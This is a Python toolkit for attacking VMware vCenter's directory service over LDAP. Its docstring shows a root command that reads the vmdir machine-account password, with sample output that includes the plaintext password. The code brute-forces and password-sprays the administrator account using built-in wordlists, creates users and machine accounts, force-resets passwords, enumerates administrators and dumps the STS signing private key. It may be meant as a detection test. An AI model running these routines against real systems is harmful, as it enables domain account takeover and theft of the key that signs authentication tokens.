import configparser
import random
import string
from urllib.parse import unquote

import ldap3
from ldap3 import Connection
from concurrent.futures import ThreadPoolExecutor, wait, ALL_COMPLETED
from threading import Lock

"""
1.ldap密码爆破
2.ldap密码喷洒
3.ldap新增用户
4.ldap新增ACL
5.ldap重置用户密码
6.ldap重置管理员密码
"""

g_lock = Lock()


class VCLdap:
    """
    利用ldap对vCenter系统域用户进行操作
    ldap凭据可通过以下命令获取(需要root权限)
    /opt/likewise/bin/lwregshell list_values '[HKEY_THIS_MACHINE\services\vmdir]'

    root@localhost [ ~ ]# /opt/likewise/bin/lwregshell list_values '[HKEY_THIS_MACHINE\services\vmdir]'
    +  "Arguments"         REG_SZ          "/usr/lib/vmware-vmdir/sbin/vmdird -s -l 0 -f /usr/lib/vmware-vmdir/share/config/vmdirschema.ldif"
    +  "Autostart"         REG_DWORD       0x00000001 (1)
    +  "dcAccount"         REG_SZ          "192.168.100.62"
    +  "dcAccountDN"       REG_SZ          "cn=192.168.100.62,ou=Domain Controllers,dc=vsphere,dc=local"
    +  "dcAccountPassword" REG_SZ          "N3P;0!Fp/cJP*~ir9%~|"
    +  "DirtyShutdown"     REG_DWORD       0x00000000 (0)
    +  "LduGuid"           REG_SZ          "82e1c057-678f-4793-9600-efc20b2b3407"
    +  "MachineGuid"       REG_SZ          "e69c362a-1e76-41d7-a759-dd43270a0bbd"
    +  "SiteGuid"          REG_SZ          "17bb1ae7-4b6a-4050-af7d-45293b59f255"
       "Dependencies"      REG_SZ          "vmafd"
       "Description"       REG_SZ          "VMware Directory Service"
       "Environment"       REG_SZ          ""
       "Path"              REG_SZ          "/usr/lib/vmware-vmdir/sbin/vmdird"
       "Type"              REG_DWORD       0x00000001 (1)
    """

    def __init__(self, addr, account, passwd):
        self.conn = Connection(addr, account, passwd, auto_bind=True)

        base_dn = ''
        resp = self.conn.search(search_base=base_dn,
                                search_filter='(objectClass=*)',
                                search_scope='BASE',
                                attributes=['namingContexts'])

        self.nc = dict(self.conn.response[0]['attributes'])['namingContexts'][0]

    def add_user(self, username, passwd, machine_user=False):
        print(f'新增用户: {username} 密码: {passwd}')
        user_dn = f'cn={username},cn=Users,{self.nc}'
        obj_class = 'user'
        attrs = {
            'cn': username,
            'samAccountName': username,
            'userPrincipalName': username + '@' + self.nc.replace('dc=', '').replace(',', '.'),
            'userPassword': passwd
        }
        self.conn.add(
            user_dn,
            obj_class,
            attrs
        )
        print(self.conn.result)

    def add_machine_user(self, username, passwd):
        user_dn = f'cn={username},ou=Computers,{self.nc}'
        obj_class = 'computer'
        attrs = {
            'cn': username,
            'samAccountName': username,
            # 'userPrincipalName': username + '@' + self.nc.replace('dc=', '').replace(',', '.'),
            'userPassword': passwd
        }
        self.conn.add(
            user_dn,
            obj_class,
            attrs
        )

    def change_pass(self, username, new_pass):
        print(f'用户 {username} 密码重置为 {new_pass}')
        self.conn.modify(
            f'cn={username},cn=users,{self.nc}',
            changes={
                'userPassword': (ldap3.MODIFY_REPLACE, [new_pass])
            }
        )
        print(self.conn.result)

    def change_uac(self, username, value):
        self.conn.modify(
            f'cn={username},cn=users,{self.nc}',
            changes={
                'userAccountControl': (ldap3.MODIFY_REPLACE, [value])
            }
        )
        print(self.conn.response)
        pass

    def detete_user(self, username):
        print(f'删除用户: {username}')
        self.conn.delete(f'cn={username},cn=users,{self.nc}')
        print(self.conn.result)

    def query_acl(self):
        sb = f'cn=AclModel,cn=VmwAuthz,cn=services,{self.nc}'
        sf = f'(objectClass=vmwAuthzAclMap)'
        self.conn.search(
            search_base=sb,
            search_filter=sf,
            search_scope='SUBTREE',
            attributes=['vmwAuthzPermissionRoleId']
        )
        for entry in self.conn.response:
            # print(unquote(entry['dn']).split(','))
            parsed_dn = unquote(entry['dn']).split(',')
            dn_parts = parsed_dn[0].strip('cn=').split('@')
            attrs = ['principalName', 'propagate', 'docuri']
            print(dict(entry['attributes']))
        # self.conn.response

    def get_roles(self):
        pass

    def get_private_key(self):
        search_filter = '(objectclass=vmwSTSTenantCredential)'
        STS_PRIV_KEY = 'vmwSTSPrivateKey'
        USER_CERT = 'userCertificate'
        self.conn.search(
            search_base=self.nc,
            search_scope='SUBTREE',
            search_filter=search_filter,
            attributes=[STS_PRIV_KEY, USER_CERT]
        )

        for entry in self.conn.response:
            item = dict(entry['attributes'])
            for k, v in item.items():
                print(k, v)

    def query_admins(self):
        search_filter = '(&(objectClass=vmwAuthzAclMap)(vmwAuthzPermissionRoleId=-1))'
        self.conn.search(
            search_base=self.nc,
            search_scope='SUBTREE',
            search_filter=search_filter,
            attributes=['vmwAuthzPrincipalName']
        )
        print('[+] vCenter Admins(-1)')
        for enrty in self.conn.response:
            print(dict(enrty['attributes']).get('vmwAuthzPrincipalName'))


def ldap_auth(ldap_ip, user_dn, password):
    try:
        Connection(ldap_ip, user_dn, password, auto_bind=True)
        print(f'[+] success password:{user_dn} -> {password}')
    except Exception as e:
        g_lock.acquire()
        print(f'[-] {password} - {e}')
        g_lock.release()


# 爆破
def ldap_brute_test(addr):
    wordlist = """admin
123456
password
12345678
666666
111111
1234567
qwerty
siteadmin
administrator
root
123123
123321
1234567890
letmein123
test123
demo123
pass123
123qwe
qwe123
654321
loveyou
adminadmin123
Zawx@2022""".split('\n')
    user = 'cn=administrator,cn=Users,dc=vsphere,dc=local'

    with ThreadPoolExecutor(max_workers=10) as pool:
        fs = [pool.submit(ldap_auth, addr, user, password.strip()) for password in wordlist]
    wait(fs, return_when=ALL_COMPLETED)


# 喷洒
def ldap_pwd_spray_test(addr):
    user_wordlist = """adm
admin
user
admin1
hostname
manager
qwerty
root
support
sysadmin
test
wordpress
administrator""".split('\n')
    passwd = 'Zawx@2022'

    with ThreadPoolExecutor(max_workers=10) as pool:
        fs = [pool.submit(ldap_auth, addr, f'cn={line.strip()},cn=Users,dc=vsphere,dc=local', passwd) for line in
              user_wordlist]
    wait(fs, return_when=ALL_COMPLETED)


# 新增用户
def add_user_test(vc: VCLdap, username):
    passwd = ''.join(random.choices(string.ascii_uppercase, k=2)) + '@' + ''.join(
        random.choices(string.ascii_letters, k=5)) + ''.join(random.choices(string.digits, k=5))
    vc.add_user(username, passwd)


# 强制修改用户密码
def reset_user_passwd(vc: VCLdap, username):
    passwd = ''.join(random.choices(string.ascii_uppercase, k=2)) + '@' + ''.join(
        random.choices(string.ascii_letters, k=5)) + ''.join(random.choices(string.digits, k=5))
    print(f'[+] moding user {username}', f'password is {passwd}')
    vc.change_pass(username, passwd)


def add_acl_global():
    pass


if __name__ == '__main__':
    config = configparser.ConfigParser()
    config.read('example.ini')
    config = config['vc70']

    vc_addr = config.get('vc_ip')
    # vc_user = 'cn=192.168.100.33,ou=Domain Controllers,dc=vsphere,dc=local'
    vc_user = config.get('ldap_user')
    vc_pass = config.get('ldap_pass')
    print(vc_pass)
    app = 'vmdird'
    from datetime import datetime

    print('time:', datetime.today())
    print(f'{"-" * 20}密码爆破测试{"-" * 20}')
    ldap_brute_test(vc_addr)

    print(f'{"-" * 20}密码喷洒测试{"-" * 20}')
    ldap_pwd_spray_test(vc_addr)
    # exit(1)
    vc = VCLdap(vc_addr, vc_user, vc_pass)
    # print(f'{"-" * 20}查询管理员{"-" * 20}')
    # vc.query_admins()
    # exit(1)
    username = ''.join(random.choices(string.ascii_letters, k=10))
    try:
        print(f'{"-" * 20}新增用户测试{"-" * 20}')
        add_user_test(vc, username)

        print(f'{"-" * 20}重置用户密码测试{"-" * 20}')
        reset_user_passwd(vc, username)
    except Exception as e:
        print(str(e))
    finally:
        vc.detete_user(username)

    # print(f'syslog5424_app: {app} and host: {vc_addr}')
